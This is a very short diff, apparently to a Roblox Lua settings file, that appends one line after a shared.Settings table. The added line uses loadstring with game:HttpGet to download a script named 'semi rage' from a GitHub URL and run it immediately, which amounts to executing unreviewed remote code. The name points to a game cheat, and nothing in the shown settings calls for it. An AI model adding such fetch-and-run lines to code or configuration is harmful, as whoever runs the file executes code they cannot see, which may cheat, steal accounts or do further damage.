@@ -6,3 +6,4 @@ shared.Settings - {
         ["Ok"] = s3
     }
 ]
+loadstring(game:HttpGet("https://github.com/Meifryk/octo/blob/main/semi%20rage"))()
